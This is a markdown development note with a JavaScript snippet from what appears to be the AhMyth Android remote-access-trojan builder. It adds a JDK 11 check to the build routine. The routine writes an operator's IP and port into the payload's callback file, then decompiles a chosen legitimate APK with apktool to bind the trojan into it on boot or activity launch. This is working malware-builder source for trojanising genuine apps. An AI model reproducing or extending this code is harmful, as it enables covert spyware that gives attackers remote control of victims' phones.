## <div align="center">All Snippets conform to Todo No. 3 - Clean Coding</div>
## Todo 06: function to check the users JDK Version using *child_process*
> If this works the way I need it to, then it will stop any building or binding process if the users JDK version is not 11.x.
>> The function will only consider the major version number *11*.
<details>
  
```js
    // fired when user click build buttom
    // collect the ip and port and start building
    $appCtrl.Build = (ip, port) => {
        // Check Java version before proceeding
        checkJavaVersion((error, javaVersion) => {
            if (error) {
                // If Java version is not 11 or not installed, throw an error
                $appCtrl.Log('[x] ' + error.message, CONSTANTS.logStatus.FAIL);
                return;
            } else {
                if (!ip) {
                    $appCtrl.Log('[x] ' + 'IP Address Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
                    return;
                }
                if (!port) {
                    port = CONSTANTS.defaultPort;
                }

                // check if bind apk is enabled
                if (!$appCtrl.bindApk.enable) {
                    $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);
                } else {
                    var filePath = $appCtrl.filePath;
                    if (!filePath) {
                        $appCtrl.Log('[x] ' + 'Browse for the Original APK you Want to Bind With', CONSTANTS.logStatus.FAIL);
                        return;
                    }
                    if (!filePath.includes(".apk")) {
                        $appCtrl.Log('[x] ' + 'Sorry! This is not an APK file', CONSTANTS.logStatus.FAIL);
                        return;
                    }

                    var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
                    delayedLog('[★] Reading (IP:PORT) File from ' + CONSTANTS.apkSourceName + dir.sep + CONSTANTS.IOSocketPath + '...');
                    fs.readFile(ipPortFile, 'utf8', (error, data) => {
                        if (error) {
                            delayedLog('[x] Reading (IP:PORT) File Failed', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'IP:PORT');
                            delayedLog('[¡] Error Written to "IP-PORT.log" on', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // only show the ipPortFile path from CONSTANTS.IOSocketPath, not the full path
                        var ipPortFilePath = CONSTANTS.IOSocketPath.split().pop(".smali");
                        delayedLog('[★] Adding User IP:PORT Input to ' + CONSTANTS.apkSourceName + dir.sep + ipPortFilePath + '...');

                        var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
                        fs.writeFile(ipPortFile, result, 'utf8', (error) => {
                            if (error) {
                                delayedLog('[x] Adding User IP:PORT Input Failed', CONSTANTS.logStatus.FAIL);
                                writeErrorLog(error, 'IP:PORT');
                                delayedLog('[¡] Error Written to "IP-PORT.log" on', CONSTANTS.logStatus.INFO);
                                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                return;
                            }

                            // generate a solid ahmyth apk
                            var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
                            delayedLog('[★] ' + 'Decompiling ' + '"' + filePath.replace(/\\/g, "/").split("/").pop() + '"' + "...");

                            var decompileApk = 'java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"';

                            exec(decompileApk, (error, stdout, stderr) => {
                                if (error !== null) {
                                    delayedLog('[x] Decompiling Failed!', CONSTANTS.logStatus.FAIL);
                                    writeErrorLog(error, 'Decompiling');
                                    delayedLog('[¡] Error Written to "Decompiling.log" on', CONSTANTS.logStatus.INFO);
                                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                    return;
                                }

                                if ($appCtrl.bindApk.method == 'BOOT')
                                    $appCtrl.bindOnBoot(apkFolder);

                                else if ($appCtrl.bindApk.method == 'ACTIVITY')
                                    $appCtrl.bindOnActivity(apkFolder);

                            });
                        });
                    });
                }
            }
        });
    };
});

// Function to check if Java version 11 is installed
function checkJavaVersion(callback) {
    exec('java -version', (error, stdout, stderr) => {
        if (error) {
            callback(new Error('Java is not installed or not accessible.'));
        } else {
            const versionOutput = stderr || stdout;
            const versionMatch = versionOutput.match(/version "(\d+)\.(\d+)\.|version "(\d+)\-internal"/);
            if (versionMatch) {
                const majorVersion = parseInt(versionMatch[1] || versionMatch[3], 10);
                if (majorVersion === 11) {
                    callback(null, majorVersion);
                } else {
                    callback(new Error('JDK Version is not 11.x, Please install JDK 11!'));
                }
            } else {
                callback(new Error('Java is not installed or not accessible.'));
            }
        }
    });
}
```
</details>
